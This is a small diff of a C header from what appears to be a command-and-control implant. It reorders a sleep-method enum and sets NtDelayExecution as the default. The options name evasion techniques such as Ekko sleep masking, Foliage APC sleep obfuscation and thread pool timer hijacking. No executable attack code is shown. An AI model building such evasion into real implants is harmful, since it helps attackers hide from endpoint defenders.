@@ -39,9 +39,9 @@ typedef enum _CHANNEL_TYPE {
 /* ------------------------------------------------------------------ */
 
 typedef enum _SLEEP_METHOD {
-    SLEEP_EKKO       = 0,
+    SLEEP_DELAY      = 0,   /* NtDelayExecution (safe default) */
     SLEEP_WFS        = 1,   /* WaitForSingleObject        */
-    SLEEP_DELAY      = 2,   /* NtDelayExecution           */
+    SLEEP_EKKO       = 2,   /* Timer queue sleep masking   */
     SLEEP_FOLIAGE    = 3,   /* APC-based sleep obfuscation */
     SLEEP_THREADPOOL = 4,   /* Thread pool timer hijack    */
 } SLEEP_METHOD;
